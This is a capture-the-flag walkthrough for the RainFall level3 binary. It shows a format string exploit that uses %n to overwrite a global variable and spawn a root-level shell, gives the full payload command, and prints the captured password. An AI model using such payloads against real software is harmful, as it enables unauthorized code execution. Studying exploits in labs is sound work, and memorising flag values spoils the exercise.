in this binary we have a simple format string vulnerability.

we give our program an input and it prints it back. after that it checks if an uninitialized global variable `m` is no equal to `0x40` and based on that it either returns `m` value or executes `system("/bin/sh")`

```c
if (m != 64)
        return m;
    
fwrite("Wait what?!\n", 1, 12, stdout);
return system("/bin/sh");
```

but the problem is `m` is uninitialized so the condition will always be true, but since printf takes our input without any specifier we can exploit format string.

we will be using the `%n` specifier to overwrite `m` value

what `%n` specifier does is: `The  number  of characters written so far is stored into the integer pointed to by the corresponding argument.`

```c
printf("AAAA%n", &a);
```
assuming we have an int `a` declared, the printf will print `AAAA` and store 4 (the size of "AAAA") in the variable a.

ok then, since we have format string we can use `%n` and write to any adress in the stack.

```bash
level3@RainFall:~$ ./level3 
AAAA%p %p %p %p %p %p %p %p %p %p    
AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```

we can see that we can reach our input in the fourth address of the stack
`0x41414141 => "AAAA"`. and the address of the m variable is `0x804988c`

```x86asm
0x080484da <+54>:	mov    eax,ds:0x804988c ; the address of m
0x080484df <+59>:	cmp    eax,0x40
```

now with all the information we have we know what to do:

we write a string of length 64 in the address which we will write in the beginning fo that string and access it using `%n`

```bash
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08%60x%4$n"'; cat) | ./level3
�                                                         200
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

and there you go.